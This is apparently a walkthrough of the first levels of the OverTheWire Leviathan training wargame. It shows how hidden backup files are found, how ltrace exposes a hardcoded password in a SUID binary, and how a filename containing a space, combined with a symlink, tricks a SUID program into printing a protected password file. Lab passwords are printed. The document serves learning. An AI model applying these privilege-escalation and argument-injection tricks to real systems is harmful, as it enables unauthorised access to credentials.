# 0

Remember the ssh command: `ssh [USERNAME]@leviathan.labs.overthewire.org -p 2223`

```
Username: leviathan0
Password: leviathan0
```

Looking at the home directory, there is a hidden folder `.backups`

Inside it contains `bookmarks.html`, possibly containing bookmarks for a web browser.

You can't just cat it though, since it's too  large. Instead I grepped it with `leviathan` to see if i can find a password. and i did.

```
leviathan0@gibson:~$ ls -la
total 24
drwxr-xr-x  3 root       root       4096 Jul 17 15:57 .
drwxr-xr-x 83 root       root       4096 Jul 17 15:59 ..
drwxr-x---  2 leviathan1 leviathan0 4096 Jul 17 15:57 .backup
-rw-r--r--  1 root       root        220 Mar 31 08:41 .bash_logout
-rw-r--r--  1 root       root       3771 Mar 31 08:41 .bashrc
-rw-r--r--  1 root       root        807 Mar 31 08:41 .profile
leviathan0@gibson:~$ cd .backup/
leviathan0@gibson:~/.backup$ ls
bookmarks.html
leviathan0@gibson:~/.backup$ cat bookmarks.html | grep leviathan
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is 3QJ3TgzHDq" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
```

# 1

```
Username: leviathan1
Password: 3QJ3TgzHDq
```

Doing `ls -la` shows that there is a binary file called `check`. However, this file has a set SUID, which means that whenever we run it, it will always run as it's owner, that being `leviathan2`.

Running it asks for a password, which we don't know. 

However I can tell that this seems to be a badly written C program, because when I put a single letter as the password, it freezes. 

I did find out that there is a command called `ltrace` in this system. ltrace basically prints out a function whenever a system library is called. This is useful because if this program uses a function like `strcmp` then we can get the password very easily. 

Using this we can find out the password is `sex` (Lol). If we run the program normally with the password we get access to the shell, presumably running as `leviathan2`. Now we can just do `cat /etc/leviathan_pass/leviathan2` and get the password for the next level .

Note that this is an unstable shell, copypasting and tabbing does not work here!

```
leviathan1@gibson:~$ ls -la
total 36
drwxr-xr-x  2 root       root        4096 Jul 17 15:57 .
drwxr-xr-x 83 root       root        4096 Jul 17 15:59 ..
-rw-r--r--  1 root       root         220 Mar 31 08:41 .bash_logout
-rw-r--r--  1 root       root        3771 Mar 31 08:41 .bashrc
-r-sr-x---  1 leviathan2 leviathan1 15080 Jul 17 15:57 check
-rw-r--r--  1 root       root         807 Mar 31 08:41 .profile
leviathan1@gibson:~$ ltrace ./check
__libc_start_main(0x80490ed, 1, 0xffffd494, 0 <unfinished ...>
printf("password: ")                                                   = 10
getchar(0, 0, 0x786573, 0x646f67password: test
)                                      = 116
getchar(0, 116, 0x786573, 0x646f67)                                    = 101
getchar(0, 0x6574, 0x786573, 0x646f67)                                 = 115
strcmp("tes", "sex")                                                   = 1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                                   = 29
+++ exited (status 0) +++
leviathan1@gibson:~$ ./check 
password: sex
$ cat /etc/leviathan_pass/leviathan2
NsN1HwFoyN
```

# 2

```
Username: leviathan2
Password: NsN1HwFoyN
```

Just like the previous level, there is a program with a SUID to the next level's user.

`printfile` seems to print a file, but running `ltrace ./printfile` with a file that doesn't exist calls the function `access([FILENAME], 4)`. This function checks is we specifically have access to a file, not leviathan3. So we can't just do `./printfile /etc/leviathan_pass/leviathan3`

When I run the program again with a file we do have access to, it shows that the following functions run:

```
leviathan2@gibson:~$ touch /tmp/test1234
leviathan2@gibson:~$ ltrace ./printfile /tmp/test1234
...
access("/tmp/test1234", 4)                                             = 0
snprintf("/bin/cat /tmp/test1234", 511, "/bin/cat %s", "/tmp/test1234") = 22
...
system("/bin/cat /tmp/test1234" <no return ...>
```

This shows that the program uses system calls, in this case it calls `cat`. 

The problem with system calls in a program is that they do not preserve the true file names that we input, such as filenames that include spaces. For example, if i make a file called `a b` and run `ltrace ./printfile "a b"` , the program will call `access("a b")` , which will return true, but then it will run `system(/bin/cat a b)`. This will make cat attempt to print contents of `a` and `b`, both files that do not exist.

I used this approach to get the password for the next level. To make things easier, I made a temp folder in `/tmp` and gave it full access perms to everyone else, then made a symlink to `/etc/leviathan_pass/leviathan3` as `pwfile`. I then made another file called `pwfile no`, then run the program using that filename.

```
leviathan2@gibson:~$ ls -la
total 36
drwxr-xr-x  2 root       root        4096 Jul 17 15:57 .
drwxr-xr-x 83 root       root        4096 Jul 17 15:59 ..
-rw-r--r--  1 root       root         220 Mar 31 08:41 .bash_logout
-rw-r--r--  1 root       root        3771 Mar 31 08:41 .bashrc
-r-sr-x---  1 leviathan3 leviathan2 15068 Jul 17 15:57 printfile
-rw-r--r--  1 root       root         807 Mar 31 08:41 .profile
leviathan2@gibson:~$ mkdir /tmp/test532
leviathan2@gibson:~$ chmod 777 /tmp/test532
leviathan2@gibson:~$ ln -s /etc/leviathan_pass/leviathan3 /tmp/test532/pwfile 
leviathan2@gibson:~$ touch /tmp/test532/"pwfile no"
leviathan2@gibson:~$ ./printfile /tmp/test532/"pwfile no"
f0n8h2iWLP
/bin/cat: no: No such file or directory
```

# 3

```
Username: leviathan3
Password: f0n8h2iWLP
```
